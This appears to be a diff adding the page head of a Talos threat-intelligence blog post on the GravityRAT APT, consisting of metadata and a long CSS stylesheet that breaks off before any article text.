@@ -1,0 +1,5364 @@
+<!DOCTYPE html>
+<html class='v2' dir='ltr' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+<link href='https://www.blogger.com/static/v1/widgets/115981500-css_bundle_v2.css' rel='stylesheet' type='text/css'/>
+<meta content='width=1100' name='viewport'/>
+<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
+<meta content='blogger' name='generator'/>
+<link href='https://blog.talosintelligence.com/favicon.ico' rel='icon' type='image/x-icon'/>
+<link href="https://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html" rel='canonical' />
+<link rel="alternate" type="application/atom+xml" title="Cisco Talos Intelligence Group - Comprehensive Threat Intelligence - Atom" href="https://blog.talosintelligence.com/feeds/posts/default" />
+<link rel="alternate" type="application/rss+xml" title="Cisco Talos Intelligence Group - Comprehensive Threat Intelligence - RSS" href="https://blog.talosintelligence.com/feeds/posts/default?alt=rss" />
+<link rel="service.post" type="application/atom+xml" title="Cisco Talos Intelligence Group - Comprehensive Threat Intelligence - Atom" href="https://www.blogger.com/feeds/1029833275466591797/posts/default" />
+
+<link rel="alternate" type="application/atom+xml" title="Cisco Talos Intelligence Group - Comprehensive Threat Intelligence - Atom" href="https://blog.talosintelligence.com/feeds/6188594294975286687/comments/default" />
+<!--[if IE]><script type="text/javascript" src="https://www.blogger.com/static/v1/jsbin/951198144-ieretrofit.js"></script>
+<![endif]-->
+<link href='https://4.bp.blogspot.com/-5E4KVZuTj5E/WuAYwbmY4_I/AAAAAAAAAY8/yCEYZxdvDe0fqeXPtmrrvHiKdDSBT7dIwCLcBGAs/s640/file_733462E4-BF82-4065-B7FF-6A3871E8A954.jpg' rel='image_src'/>
+<meta content='http://blog.talosintelligence.com/2018/04/gravityrat-two-year-evolution-of-apt.html' property='og:url'/>
+<meta content='GravityRAT - The Two-Year Evolution Of An APT Targeting India' property='og:title'/>
+<meta content='A blog from the world class Intelligence Group, Talos, Cisco&#39;s Intelligence Group' property='og:description'/>
+<meta content='https://4.bp.blogspot.com/-5E4KVZuTj5E/WuAYwbmY4_I/AAAAAAAAAY8/yCEYZxdvDe0fqeXPtmrrvHiKdDSBT7dIwCLcBGAs/w1200-h630-p-k-no-nu/file_733462E4-BF82-4065-B7FF-6A3871E8A954.jpg' property='og:image'/>
+<!--[if IE]> <script> (function() { var html5 = ("abbr,article,aside,audio,canvas,datalist,details," + "figure,footer,header,hgroup,mark,menu,meter,nav,output," + "progress,section,time,video").split(','); for (var i = 0; i < html5.length; i++) { document.createElement(html5[i]); } try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {} })(); </script> <![endif]-->
+<title>Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: GravityRAT - The Two-Year Evolution Of An APT Targeting India</title>
+<link href='https://fonts.googleapis.com/css?family=Roboto:100,300,400|Exo+2:500,400,300,100,700|Fira+Mono' rel='stylesheet'/>
+<style id='page-skin-1' type='text/css'><!--
+.CSS_LIGHTBOX {
+z-index: 9999 !important;
+}
+html,body,div {
+margin:0;
+padding:0;
+border:0;
+}
+html,body {width:100%;height:100%;position:relative;}
+body {
+display: table;
+background-color: #26282A;
+overflow-x: hidden;
+color: #FFF;
+font-family: 'Roboto', sans-serif;
+font-weight: 300;
+font-size: 11.5pt;
+line-height: 1.5em !important;
+text-align:left;
+}
+#header {
+display: none;
+}
+a {
+text-decoration: none;
+}
+.widget {
+line-height: 1.5em;
+}
+/* Float Controls */
+.float-left  { float: left; }
+.float-right { float: right; }
+#page_wrapper {
+min-height: 100%;
+min-width:  100%;
+background-color: #26282A;
+position: relative;
+top:    0;
+bottom: 100%;
+left:   0;
+z-index: 300;
+/*display: table-row; This was needed for sticky footer, but interferes with new mobile nav*/
+}
+.col_single {
+max-width: 1200px;
+width: 100%;
+margin: 0 auto;
+height: 100%;
+float: none;
+padding: 80px 15px 150px 15px;
+}
+.col_single .col-xs-12 { padding: 0 35px; }
+.col-xs-12.wide { padding: 0 15px;}
+#main-wrapper {
+margin-left: 2%;
+width: 98%;
+display: inline;
+word-wrap: break-word;
+overflow: hidden;
+}
+@media (min-width: 950px) {
+#main-wrapper {
+width: 67%;
+float: left;
+}
+}
+label {
+font-weight: 300;
+text-align: left;
+font-size: 10pt;
+font-family: 'Roboto', sans-serif;
+text-transform: none;
+left: 0;
+line-height: 1em !important;
+display: block;
+color: #bdb5b5;
+padding-bottom: 4px;
+}
+/********* Navigation styles **********/
+/* full navigation wrapper(s) */
+#nav {
+/*height: 100%;*/
+margin: auto;
+font-family: 'Roboto', sans-serif;
+font-weight: 300;
+font-size: 11pt;
+background-color: #1f1f21;
+}
+#navigation {
+width:  100%;
+height: 100%;
+position: fixed;
+top:    0;
+right:  0;
+bottom: 0;
+left:   0;
+z-index: 0;
+background-color: #005f8e;
+text-align: left;
+padding: 0;
+}
+/** This section after removing icons from desktop display **/
+#top-nav-bar {
+background-color: #161617;
+color: #bfbfbf;
+font-size: 11px;
+font-weight: 400;
+text-transform: uppercase;
+text-align: right;
+padding: 0 12px;
+/* only show on desktop sizes */
+display: none;
+}
+.top-nav-links-wrapper li.site-link a {
+padding-left: 20px !important;
+background-size: 14px;
+background-position: 0 4px;
+font-weight: 400 !important;
+color: #bfbfbf !important;
+width: 100%;
+height: 25px;
+}
+.top-nav-links-wrapper li.site-link a:hover {
+color: #fff !important;
+}
+.account-link { background-image: url('icon_account_small.svg'); }
+.account-link:hover { background-image: url('icon_account_small_white.svg'); }
+li.site-link a {
+background-repeat: no-repeat;
+}
+.navigation-links-wrapper .site-link a {
+background-size: 100%;
+background-position: center center;
+min-width: 20px;
+min-height: 20px;
+margin-bottom: -4px;
+}
+.navigation-links-wrapper .site-link:first-of-type {
+margin-left: 50px;
+}
+/* Navigation needs to be behind page wrapper for mobile but in front of it for desktop */
+@media (min-width: 1000px) {
+#nav {
+height: 80px !important;
+font-size: 9pt;
+}
+#navigation {
+z-index: 500;
+background-color: transparent;
+text-align: center;
+position:relative;
+}
+#top-nav-bar {
+display: block;
+}
+}
+#nav ul {
+list-style: none;
+margin:  0;
+padding: 0;
+display: block;
+}
+#nav ul.main-nav-list {
+margin: 0 auto;
+left: 0;
+}
+#nav li {
+text-align: left;
+}
+.nav-item {
+width: 300px;
+border: 1px solid #005f8e;
+}
+#nav a {
+color: #fff;
+font-weight: 300;
+display: block;
+height: 100%;
+width:  100%;
+-webkit-transition: color 0.2s ease, background-color 0.5s ease;
+-moz-transition:    color 0.2s ease, background-color 0.5s ease;
+-o-transition:      color 0.2s ease, background-color 0.5s ease;
+transition:         color 0.2s ease, background-color 0.5s ease;
+}
+#nav a:hover { color: #fff; background-color: #393d43; }
+.nav-item a  { padding: 10px 15px; }
+.nav-item:hover { border: 1px solid #393d43; }
+@media (min-width: 1000px) {
+.nav-item, .nav-item:hover { border: none; }
+}
+/* Overrides natural list display styles for horizontal nav on desktop */
+/* Also splits navigation so there is a section on either side of logo */
+@media (min-width: 1000px) {
+#nav a {
+padding: 0;
+color: #9ea0a5;
+font-weight: 400;
+}
+#nav a.primary_nav_link {
+/* increasing contrast */
+color: #fff;
+font-size: 1.1em;
+padding-top: 19px;
+padding-bottom: 19px;
+font-weight: 300;
+}
+#nav a.primary_nav_link:hover span {
+box-shadow: 0 2px 0 0 #0076be;
+}
+#nav a:hover {
+background-color: transparent;
+}
+#nav li {
+display: inline-block;
+text-align: center;
+height: 100%;
+margin: 0 10px;
+}
+#nav .sub-nav li { display:block;}
+#nav span { display: block; line-height: 1.15em; }
+}
+@media (min-width: 1300px) {
+#nav li { margin: 0 15px;}
+#nav a.primary_nav_link {
+font-size: 1.25em;
+}
+}
+.break { display: none;}
+/* Spacing between nav icons on large displays, also changes word breaks on longer link titles */
+@media (min-width: 1000px) { .break { display: inline !important; } }
+@media (min-width: 1170px) { .break { display: none !important; } }
+/* end structural styles */
+/****** LOGOS ******/
+.navigation-logos-wrapper {
+display: block;
+float: left;
+min-width: 300px;
+padding-top: 8px;
+text-align: left;
+}
+.navigation-links-wrapper {
+display:block;
+}
+@media (min-width: 1000px) {
+.navigation-links-wrapper {
+display:inline-block;
+margin-left: -75px;
+}
+}
+@media (min-width: 1300px) {
+.navigation-links-wrapper {
+display:inline-block;
+margin-left: -115px;
+}
+}
+@media (min-width: 1600px) {
+.navigation-links-wrapper {
+/* centers links, accounts for logo wrapper on left of desktop nav */
+margin-left: -300px;
+}
+}
+#cisco-logo-wrapper, #talos-logo-wrapper {
+display: inline-block;
+}
+#cisco-logo-wrapper {
+border-right: 1px solid #3f4143;
+margin-left: 10px;
+margin-right: 11px;
+background-image: url('https://www.talosintelligence.com/assets/logo_cisco_white.svg');
+background-repeat: no-repeat;
+width: 82px;
+height: 35px;
+opacity: 0.6;
+}
+#talos-logo-wrapper svg {
+height: 36px;
+width: auto;
+}
+#talos-logo-wrapper svg path {
+fill: #0077BE;
+}
+#nav-logo svg {
+transition:         max-width 0.2s ease;
+-webkit-transition: max-width 0.2s ease;
+-moz-transition:    max-width 0.2s ease;
+-o-transition:      max-width 0.2s ease;
+}
+#nav-logo svg path {
+transition:         fill 0.2s ease;
+-webkit-transition: fill 0.2s ease;
+-moz-transition:    fill 0.2s ease;
+-o-transition:      fill 0.2s ease;
+}
+@media (min-width: 1000px) {
+#nav-logo {
+background-color: transparent;
+}
+}
+/* Mobile navigation has an additional icon for 'home' in the shelf menu since
+/* the main logo stays in the center of the page away from other menu items */
+#mobile-nav-topper {
+display: inline-block;
+width: 300px;
+padding: 9px 10px 4px 10px;
+background-color: #1278ba;
+border-bottom: 1px solid #fff;
+text-align: center;
+}
+#mobile-nav-topper a:hover {
+background: transparent !important;
+}
+@media (min-width: 1000px) {
+#mobile-nav-topper { display: none; }
+}
+/* end mobile logo styles */
+/****** NAVIGATION LINK ICONS *******/
+.nav-item svg {
+padding-top: 3px;
+margin-top: 7px;
+}
+@media (min-width: 1000px) {
+.nav-item svg { padding: 0; margin: 0; }
+}
+#link_blog { margin-top: -1px; } /* Adjusts for pencil that sticks slightly above icon box */
+/****** LINK TEXT ADJUSTMENTS ******/
+#nav span {
+padding-left: 15px;
+vertical-align: 5px; /* offsets span sitting at bottom of <a> tag on mobile nav */
+}
+@media (min-width: 1000px){
+#nav span {
+padding-left: 0;
+vertical-align: baseline;
+}
+.primary_nav_link svg {
+display: none;
+}
+}
+/* Mobile Shelf Styles */
+.nav-trigger + label, #page_wrapper, #nav-logo, #footer, .sub-nav-trigger, .sub-nav {
+transition:         left 0.2s;
+-webkit-transition: left 0.2s;
+-moz-transition:    left 0.2s;
+-o-transition:      left 0.2s;
+}
+.nav-trigger:checked + label, .nav-trigger:checked ~ #page_wrapper, .nav-trigger:checked ~ #nav-logo, .nav-trigger:checked ~ #footer {
+left: 300px;
+}
+.sub-nav-trigger:checked ~ .sub-nav {
+left: 50px;
+}
+.sub-nav-trigger:checked ~ .subnav-overlay {
+visibility: visible;
+opacity: 1;
+}
+/* If someone expands mobile nav menu and then changes browser window to desktop nav (over 1000px) */
+@media (min-width: 1000px) {
+.nav-trigger:checked + label, .nav-trigger:checked ~ #page_wrapper, .nav-trigger:checked ~ #nav-logo, .nav-trigger:checked ~ #footer {
+left: 0;
+}
+.sub-nav-trigger:checked ~ .sub-nav {
+left: 0;
+}
+.desktop-hide { display: none !important; }
+}
+/* Mobile sub navigation styles */
+.primary-link-wrapper {
+width: 243px;
+display: inline-block;
+}
+.subnav-overlay {
+width:  100%;
+height: 100%;
+position: fixed;
+top:    0;
+right:  0;
+bottom: 0;
+left:   0;
+background-color: #005f8e;
+visibility: hidden;
+opacity: 0;
+transition: visibility 0s, opacity 0.25s linear;
+}
+.subnav-overlay svg {
+opacity: 0.5;
+margin: 10px 0 0 10px;
+}
+.sub-nav {
+width:  100%;
+height: 100%;
+position: fixed;
+top:    0;
+right:  0;
+bottom: 0;
+left:   300px;
+z-index: 1;
+list-style: none;
+background: #393d43;
+}
+.sub-nav li {
+width: 100%;
+height: auto;
+}
+.sub-nav li a {
+display: block;
+padding: 12px 20px;
+color: white;
+text-decoration: none;
+}
+.sub-nav a:hover {
+background-color: #f19615;
+}
+.subnav-back-button {
+cursor: pointer;
+width: 100%;
+padding: 20px;
+background-color: #2d3035;
+}
+/* css chevron */
+.subnav-back-button::before {
+border-style: solid;
+border-width: 3px 3px 0 0;
+content: '';
+display: inline-block;
+height: 12px;
+width:  12px;
+position: relative;
+vertical-align: top;
+transform: rotate(-135deg);
+margin-right: 30px;
+}
+.sub-nav h1 {
+font-family: "Roboto", Helvetica, Arial, sans-serif;
+text-transform: none;
+font-weight: 300;
+font-size: 16pt;
+padding-top: 10px;
+margin-top: 20px;
+margin-bottom: 10px;
+}
+.sub-nav-trigger-label:hover svg g circle {
+fill: #f19615;
+}
+.sub-nav-trigger-label:hover {
+background-color: #393d43;
+}
+.sub-nav-trigger-label {
+cursor: pointer;
+padding: 0;
+margin:  0;
+text-align: center;
+display: inline-block;
+float: right;
+width: 55px;
+-webkit-transition: color 0.2s ease, background-color 0.5s ease;
+-moz-transition:    color 0.2s ease, background-color 0.5s ease;
+-o-transition:      color 0.2s ease, background-color 0.5s ease;
+transition:         color 0.2s ease, background-color 0.5s ease;
+}
+@media (min-width: 1000px) {
+.sub-nav-trigger-label, .sub-nav-trigger {
+display: none;
+}
+.primary-link-wrapper {
+width: auto;
+display: block;
+height: 100%;
+}
+}
+/* Subnav (dropdown) styles for desktop and large mobile */
+@media (min-width: 1000px) {
+.sub-nav {
+display:block !important;
+height: 0;
+top: 80px;
+z-index: 5000;
+padding: 0;
+margin-left: -55px !important;
+white-space: nowrap;
+text-align: left !important;
+left: auto;
+right: auto;
+bottom: auto;
+}
+#nav ul::before, #nav ul::after {
+content: "";
+display: table;
+}
+#nav ul::after {
+clear: both;
+}
+.sub-nav li {
+overflow: hidden;
+text-align: left !important;
+background-color: #393d43;
+height: 0;
+width: 200px;
+-webkit-transition: height 200ms ease-in, background-color 0.3s ease;
+-moz-transition:    height 200ms ease-in, background-color 0.3s ease;
+-o-transition:      height 200ms ease-in, background-color 0.3s ease;
+transition:         height 200ms ease-in, background-color 0.3s ease;
+}
+.sub-nav a {
+display: inline-block;
+margin-top: -4px;
+padding: 10px !important;
+}
+.sub-nav li:hover {
+background-color: #f19615;
+}
+.sub-nav li:hover a {
+color: #212224 !important;
+font-weight: 500 !important;
+}
+#nav ul > li:hover .sub-nav li {
+height: 36px !important;
+}
+}
+/* Mobile shelf trigger styles */
+/* hides the checkboxes */
+.nav-trigger, .sub-nav-trigger {
+position: absolute;
+clip: rect(0, 0, 0, 0);
+display: block;
+}
+label[for="nav-trigger"] {
+position: fixed;
+padding: 15px 0 0 15px;
+z-index: 9900;
+height: 50px;
+width:  100px;
+cursor: pointer;
+display: block;
+}
+.nav-item {
+height: 55px;
+}
+@media (min-width: 1000px) {
+.nav-trigger, label[for="nav-trigger"] { display: none; }
+.nav-item { width: auto; border: none;}
+}
+.login-button {
+border-radius: 2px;
+background-color: #0076be;
+color: #fff !important;
+padding: 0 6px !important;
+line-height: 1.75em;
+-webkit-transition: background .5s;
+transition: background .5s;
+}
+.login-button:hover {
+background-color: #f19615 !important;
+}
+.login-button svg {
+display: block;
+float: left;
+height: 15px;
+width: 15px;
+margin-top: -3px;
+}
+.login-button svg path {
+fill: #9EA0A5;
+-webkit-transition: fill 0.2s ease;
+-moz-transition:    fill 0.2s ease;
+-o-transition:      fill 0.2s ease;
+transition:         fill 0.2s ease;
+}
+.login-button:hover svg path {
+fill: #fff;
+}
+.display-name {
+text-transform: none;
+color: #fff;
+}
+.desktop-hide .login-button {
+max-width: 280px;
+padding: 12px 24px !important;
+font-weight: 400 !important;
+background-color: #fff;
+color: #25272a !important;
+text-align: center;
+font-size: 1.1em !important;
+}
+.acct_links {
+color: #fff;
+font-weight: 300 !important;
+font-family: 'Roboto', sans-serif;
+margin: 0;
+padding-top: 5px;
+padding-left: 10px;
+height: auto !important;
+}
+/*********** Footer Styles *********/
+#footer {
+clear: both;
+min-height: 110px;
+text-align: center;
+color: rgb(116, 118, 120);
+font-size: 10.5pt;
+font-family: 'Roboto', sans-serif;
+font-weight: 400;
+width: 100%;
+background-color: #212224;
+display: block;
+position: absolute;
+}
+.copyright{
+font-size: .85em;
+font-weight: 300;
+padding-top: 0;
+}
+a.copyright-underline{
+box-shadow:0 1px 0 0 #ed6f09;
+text-decoration:none!important;
+}
+#footer .footer_nav_wrapper {
+max-width: 1100px;
+margin: auto;
+}
+#footer ul {
+margin: auto;
+list-style: none;
+}
+#footer a {
+line-height: 25px!important
+}
+ul.footer_nav {
+text-align: center;
+padding: 0 20px;
+}
+@media  screen and (min-width: 992px) {
+ul.footer_nav {
+text-align: left;
+}
+}
+.nopad {
+margin: 0;
+padding: 0;
+}
+ul.footer_nav li.list_col {
+text-align: center;
+}
+ul.footer_nav li ul li {
+padding: 1px 0;
+}
+/* styles for full width nav col with straight 1 col list of links - small mobile screens */
+ul.footer_nav li ul.pad.second.last {
+padding-bottom: 32px;
+}
+ul.footer_nav li ul.pad.first.top {
+padding-top: 32px;
+padding-left: 0;
+}
+ul.footer_nav ul {
+padding-left: 0;
+}
+@media screen and (min-width: 450px) {
+/* styles for full width nav col, 2 list cols */
+ul.footer_nav li ul.pad {
+padding: 32px 25px 32px 0;
+}
+ul.footer_nav li ul.pad.last {
+padding-right: 0;
+padding-left: 0;
+}
+ul.footer_nav li ul.pad.second {
+padding-top: 0;
+}
+ul.footer_nav li ul.pad.first {
+padding-bottom: 0;
+}
+ul.footer_nav li.list_col {
+display: inline-block;
+text-align: left;
+}
+}
+@media screen and (min-width: 800px) {
+/* styles for full width nav col, 4 list cols */
+ul.footer_nav li ul.pad.first, ul.footer_nav li ul.pad.second {
+padding: 32px 28px 32px 0;
+}
+li.nopad {
+display:inline-block;
+}
+}
+@media screen and (min-width: 1050px) {
+/* styles for full width nav col, expanded 4 list cols - large screens */
+ul.footer_nav li ul.pad {
+padding: 32px 40px 32px 0;
+}
+}
+#footer .footer_corporate img {
+max-width: 85px;
+margin-top: 20px;
+}
+.underline {
+text-decoration: underline;
+}
+.footer_corporate {
+padding-bottom: 15px;
+border-top: 2px solid #3f4143;
+line-height: 1.35em;
+}
+#footer h5 {
+font-weight: 400;
+font-size: 11pt;
+text-align: center;
+color: #747678;
+letter-spacing: .25pt;
+}
+.row {
+clear: both;
+}
+@media  screen and (min-width: 992px) {
+.connect_social ul {
+text-align: right;
+padding-right: 20px;
+padding-bottom: 0;
+}
+.connect_social {
+width: 25%;
+display:inline-block;
+}
+.col-md-9 {
+width:75%;
+float: left;
+}
+#footer h5 {
+padding-top: 35px;
+text-align: right;
+padding-right: 52px;
+}
+}
+.connect_social ul {
+text-align: center;
+padding-right: 0;
+padding-bottom: 7px;
+padding-left: 0;
+}
+.connect_social ul li {
+display: inline-block;
+}
+.connect_social ul li img {
+width: 33px;
+height: 33px;
+margin: 5px 3px;
+}
+#footer .connect_social h5{
+padding-right: 0;
+text-align: center;
+}
+#footer a {
+color: #747678;
+cursor: pointer;
+font-family: "Exo 2", sans-serif;
+}
+#footer a:hover {color: #f19615;}
+.full-height {
+height: 100%
+}
+#content-wrapper {
+display: inline-block;
+}
+/*********** Sidebar Styles ************/
+#sidebar-wrapper {
+margin-right: 2%;
+display: inline;
+word-wrap: break-word;
+overflow: hidden;
+padding-top: 20px;
+border-left: 2px solid #26282A;
+}
+@media (min-width: 950px) {
+#sidebar-wrapper {
+width: 25%;
+float: right;
+}
+}
+.sidebar h2 {
+font-family: 'Exo 2', sans-serif;
+font-weight: 700;
+color: #3f7b9f;
+text-transform: uppercase;
+font-size: 11pt;
+letter-spacing: 1.5pt;
+}
+.sidebar ul li {
+font-size: 9pt;
+}
+.sidebar .widget {
+border-bottom: 2px solid #5c656d;
+margin: 0 0 1.5em;
+padding: 0 0 1.5em;
+}
+a.post-count-link {
+font-family: 'Exo 2', sans-serif;
+color: #9EA0A5;
+text-transform: uppercase;
+letter-spacing: 1.5pt;
+font-weight: 500;
+}
+a.post-count-link:hover {
+color: #f19615;
+}
+.posts a {
+color: #ffffff;
+}
+.posts a:hover {
+color: #f19615;
+}
+.Label ul {
+margin: 5px 0;
+padding: 5px 10px;
+list-style: none;
+list-style-image: none;
+max-height: 200px;
+overflow: scroll;
+border: 1px solid #5c656d;
+}
+.Label ul li {
+background: none;
+list-style: none;
+list-style-image: none;
+list-style-position: outside;
+border-width: 0;
+padding-left: 15px;
+text-indent: -15px;
+margin: .25em 0;
+background-image: none;
+}
+.Label ul li a {
+color: #ffffff;
+font-family: Roboto, sans-serif;
+text-transform: uppercase;
+font-size: 12px;
+}
+.Label ul li a:hover {
+color: #f19615;
+}
+/** zippy is the triangle expanders **/
+.zippy {
+color: #9EA0A5;
+}
+.subscribe-wrapper {
+margin: 0.5em 0;
+}
+div.subscribe {
+background-color: #5c656d;
+font-size: 10pt;
+font-weight: 100 !important;
+color: #ffffff;
+border-radius: 2px;
+width: 100%;
+line-height: 2em;
+padding: 1px;
+margin: 8px 0;
+transition: background-color 0.5s ease;
+}
+div.subscribe:hover {
+background-color: #9EA0A5;
+}
+div.subscribe div.top, div.subscribe div.bottom {
+background-image: none !important;
+width: 100%;
+}
+.feed-icon {
+padding: 4px 10px 6px 5px;
+width: 15px;
+height: auto;
+vertical-align: middle;
+}
+.subscribe-dropdown-arrow {
+margin-top: 3px;
+margin-left: 10px;
+}
+#category_list li{
+list-style:none;
+}
+#category_list span{
+margin-right: 9px;
+padding-left: 18px;
+white-space: nowrap;
+display: inline-block;
+}
+#category_list button{
+border: none;
+border-right: 1px solid #5c656d;
+background-color: #5c656d;
+font-size: 10pt;
+color: #ffffff;
+width: auto;
+text-align: left;
+height: 18px;
+font-size: .75em;
+margin: 0px -22px;
+display: inline-block;
+outline: none;
+text-transform: capitalize;
+transition: background-color 0.5s ease;
+}
+#category_list a {
+position: relative;
+margin-left: 20px;
+}
+#category_list button.selected{
+color: #26282A;
+background: #ef6f09;
+}
+#category_list button.selected:hover{
+background: #f19615;
+}
+#category_list button .feed-icon {
+width: 15px;
+padding: 5px 4px 5px 3px;
+}
+#category_list button:hover {
+background-color: #9EA0A5;
+}
+#category_list .feed-icon {
+padding: 6px 4px 7px 6px;
+}
+a.feed-reader-link {
+color: #ffffff !important;;
+}
+.gsc-search-button {
+background-color: #5c656d;
+border-radius: 2px;
+border: none;
+color: #ffffff;
+}
+input.gsc-input {
+width: 95% !important;
+height: 20px;
+}
+form.gsc-search-box {
+margin-top: 7px !important;
+}
+#Gadget1 h2 {
+display: none;
+}
+#Gadget1 {
+text-align: left;
+}
+A-content, .blog-content a {
+color: #ffffff;
+text-decoration: none;
+}
+.blog-title, .blog-title a {
+font-family: 'Exo 2', sans-serif;
+color: #9EA0A5;
+text-transform: uppercase;
+letter-spacing: 1.5pt;
+font-weight: 500;
+text-decoration: none;
+padding-bottom: 4px;
+}
+.blog-title a:hover, .blog-content a:hover {
+color: #f19615;
+}
+.blog-list-container .blog-icon {
+display: none;
+}
+/*********** Blog Post Styles ***********/
+.post-outer {
+margin-bottom: 40px;
+}
+.date-header {
+font-family: 'Exo 2', sans-serif;
+font-weight: 700;
+color: #9EA0A5;
+text-transform: uppercase;
+font-size: 9pt;
+letter-spacing: 1.5pt;
+padding-bottom: 5px;
+}
+.date-outer {padding: 0;}
+.date-outer a {
+color: #ffffff;
+box-shadow: 0px 1px 0px 0px #F19615;
+text-decoration: none;
+}
+.post-title, .post-title a {
+font-family: 'Exo 2', sans-serif;
+font-size: 19pt;
+font-weight: 400;
+color: #3f7b9f;
+text-decoration: none;
+padding-bottom: 20px;
+box-shadow: none;
+}
+/* removing box shadows on links with images */
+a < img { box-shadow: none !important;}
+a[imageanchor] { box-shadow: none !important;}
+h3 {
+font-family: 'Exo 2', sans-serif;
+font-weight: 500;
+color: #3f7b9f;
+font-size: 14pt;
+padding-top: 20px;
+line-height: 1.25em;
+margin-bottom: 15px;
+}
+h5 {
+font-family: 'Exo 2', sans-serif;
+font-weight: 700;
+color: #587282;
+font-size: 9pt;
+text-transform: uppercase;
+letter-spacing: 1.5pt;
+margin: 0;
+padding-top: 10px;
+}
+pre {
+font-family: 'Fira Mono', monospace;
+font-size: 10pt !important;
+line-height: 1.5em !important;
+color: #f19615;
+border: 2px solid #5c656d;
+padding: 20px;
+background-color: #26282a;
+margin: 30px 0;
+white-space: pre-wrap;       /* css-3 */
+white-space: -moz-pre-wrap;  /* Mozilla, since 1999 */
+white-space: -pre-wrap;      /* Opera 4-6 */
+white-space: -o-pre-wrap;    /* Opera 7 */
+word-wrap: break-word;
+max-width: 700px;
+}
+.entry-content h2 {
+font-family: 'Exo 2', sans-serif;
+font-weight: 400;
+color: #3f7b9f;
+text-transform: uppercase;
+font-size: 17pt;
+}
+h4 {
+font-family: 'Exo 2', sans-serif;
+font-weight: 500;
+text-transform: uppercase;
+color: #9EA0A5;
+}
+.entry-content, .post-body {
+color: #FFFFFF;
+font-family: 'Roboto', sans-serif;
+font-weight: 300;
+font-size: 11.5pt;
+line-height: 1.5em !important;
+}
+.entry-content img {
+max-width: 100%;
+height: auto;
+margin-top: 30px;
+margin-bottom: 10px;
+}
+figcaption {
+font-size: 10pt;
+color: #ec6e08;
+font-weight: 500;
+margin-bottom: 30px;
+text-align: left;
+}
+@media (min-width: 950px) {
+max-width: 700px;
+height: auto;
+}
+.post-body {
+margin-top: 10px;
+}
+.post-body table {
+}
+p {
+padding: .75em 0;
+margin: 0;
+}
+.post-footer {
+margin: 40px 0 15px 0;
+}
+.post-footer-line a, .comment-author a, .comment-timestamp a, .comment-footer a {
+text-decoration: none;
+box-shadow: none;
+color: #f19615;
+}
+.post-footer-line, .comment-author, .comment-timestamp, .comment-footer {
+color: #9EA0A5;
+font-size: 9pt;
+letter-spacing: 1.5pt;
+font-family: 'Exo 2', sans-serif;
+font-weight: 400;
+text-transform: uppercase;
+}
+.post {
+margin: .5em 0 1.5em;
+border-bottom: 1px solid #5c656d;
+padding-bottom: 1.5em;
+}
+#comments {
+border-bottom: 1px solid #5c656d;
+padding: 20px 0;
+margin-bottom: 40px;
+}
+.comment {
+border-bottom: 1px solid #5c656d;
+}
+#comments .blogger-comment-icon, .blogger-comment-icon {
+padding: 0;
+background: none;
+}
+.comment-author {
+border-top: 1px solid #5c656d;
+padding-top: 20px !important;
+}
+.comments .avatar-image-container {
+display:none;
+}
+.comment-header .user, .comment-header .user a {
+color: #f19615;
+font-family: 'Exo 2', sans-serif;
+font-weight: 500 !important;
+text-transform: uppercase;
+box-shadow: none;
+}
+.comment-header .datetime, .comment-header .datetime a {
+color: #9EA0A5;
+font-family: 'Exo 2', sans-serif;
+font-weight: 300;
+text-transform: uppercase;
+box-shadow: none;
+}
+.comments .comment-replybox-thread {
+margin-top: 40px;
+}
+h4 {
+font-family: 'Exo 2', sans-serif;
+font-weight: 500;
+text-transform: uppercase;
+color: #9EA0A5;
+}
+img.email {
+width: 25px;
+height: auto;
+}
+.blog-pager, .feed-links {
+color: #9EA0A5;
+font-size: 9pt;
+letter-spacing: 1.5pt;
+font-family: 'Exo 2', sans-serif;
+font-weight: 400;
+text-transform: uppercase;
+}
+.blog-pager a, .feed-links a {
+box-shadow: none;
+color: #f19615;
+}
+.social-media-share a {
+box-border: none !important;
+}
+.social-media-share {
+margin-top: 15px;
+display: flex;
+}
+.social-media-share img {
+width: 25px;
+height: 25px;
+margin-right: 15px;
+}
+.social-media-share span {
+font-family: 'Exo 2', sans-serif;
+font-weight: 500;
+text-transform: uppercase;
+color: #9EA0A5;
+}
+.social-media-share .linkedin img{
+width: 30px;
+height: unset;
+position: relative;
+top: -3px;
+}
+.social-call {
+float: left;
+padding-top: 4px;
+margin-right: 15px;
+}
+iframe {
+margin: 20px 0;
+max-width: 100%;
+}
+/****** Search & Label Filter Results ****/
+.status-msg-wrap {
+width: 100%;
+border-bottom: 1px solid #5c656d;
+text-align: left;
+padding-bottom: 10px;
+margin-bottom: 20px;
+}
+.status-msg-body {
+text-align: left;
+font-family: 'Roboto', sans-serif;
+font-weight: 300;
+text-transform: none;
+}
+.status-msg-body a {
+text-decoration: none;
+color:  #3f7b9f;
+font-weight: 500;
+}
+.status-msg-body b {
+color:  #f19615;
+}
+.status-msg-bg {
+background-color: transparent;
+}
+.status-msg-border {
+border: none;
+}
+#uds-searchControl .gsc-results {
+background-color: transparent !important;
+border-bottom: 2px solid #5c656d !important;
+border-top: 0 !important;
+border-left: 0 !important;
+border-right: 0 !important;
+}
+.gsc-result {
+margin-bottom: 10px !important;
+padding-bottom: 10px !important;
+}
+.gs-relativePublishedDate {
+font-family: "Exo 2",sans-serif;
+font-weight: 500;
+font-size: 9pt;
+color: #9EA0A5 !important;
+text-transform: uppercase;
+letter-spacing: 1.5pt;
+}
+#uds-searchControl .gs-result .gs-title, #uds-searchControl .gs-result .gs-title *, #uds-searchControl .gsc-results .gsc-trailing-more-results, #uds-searchControl .gsc-results .gsc-trailing-more-results * {
+font-family: "Exo 2",sans-serif;
+font-weight: 700;
+text-transform: uppercase;
+letter-spacing: 1.5pt;
+color:  #6a8596 !important;
+text-decoration: none !important;
+}
+#uds-searchControl .gs-result .gs-title b {
+color: #F19615 !important;
+}
+.gs-visibleUrl a.gs-visibleUrl {
+color: #ffffff !important;
+text-decoration: none;
+box-shadow: 0px 1px 0px 0px #F19615;
+line-height: 2em !important;
+}
+.gsc-url-bottom .gs-visibleUrl {
+color: #F19615 !important;
+font-weight: 700;
+line-height: 2em !important;
+text-decoration: underline;
+}
+#uds-searchControl .gsc-cursor-current-page {
+color: #ffffff;
